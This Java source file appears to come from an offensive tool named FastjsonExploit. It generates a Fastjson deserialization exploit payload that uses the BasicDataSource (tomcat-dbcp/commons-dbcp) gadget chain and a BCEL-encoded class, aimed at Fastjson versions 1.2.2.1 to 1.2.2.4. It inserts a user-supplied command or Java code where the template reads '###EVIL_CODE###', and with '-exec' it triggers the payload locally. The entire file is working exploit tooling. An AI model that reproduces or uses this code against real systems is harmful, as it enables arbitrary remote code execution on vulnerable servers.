package payloads;

import com.alibaba.fastjson.JSON;
import gadget.Gadget;
import payloads.annotation.Dependencies;
import payloads.annotation.PayloadType;
import payloads.annotation.VulVersion;
import util.JarFileReader;

/*
* 只能在tomcat环境
* tomcat-dbcp:9.0.8不成功
* 还依赖commons-dbcp
* */

// 需pom.xml文件中dbcp版本切换成9.x
// 基于 org.apache.tomcat.dbcp.dbcp2.BasicDataSource
// 关于dbcp不带2的是低版本的用法，例如7.0.0
// org.apache.tomcat.dbcp.dbcp.BasicDataSource
// 最终使用的是
// org.apache.commons.dbcp.BasicDataSource

@PayloadType({PayloadType.LOCAL})
@VulVersion({"1.2.2.1-1.2.2.4"})
@Dependencies({"tomcat-dbcp:tomcat-dbcp:7.x","tomcat-dbcp:tomcat-dbcp:9.x","commons-dbcp:commons-dbcp:1.4"})
public class BasicDataSource3 implements ObjectPayload {
    @Override
    public void process(String[] args) {
        if(args.length != 2 && args.length != 3){
            System.out.println("[*] Usage: java -jar FastjsonExploit-[version].jar BasicDataSource3 \"[cmd:xxx|code:xxx.java]\"");
            return;
        }

        try{
            String command = args[1].trim();
            JarFileReader jsr = new JarFileReader();
            String payload = jsr.read("BasicDataSource3.tpl");
            String classname =Gadget.getBasicDataSource3ExpCode(command);
            classname = "$$BCEL$$"+classname;
            payload = payload.replace("###EVIL_CODE###", classname);
            System.out.println("[*] payload build success!");
            System.out.println("\n" + payload + "\n");

            if(args.length == 3 && args[2].equals("-exec")){
                System.out.println("[*] Try local parsing");
                JSON.parseObject(payload);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
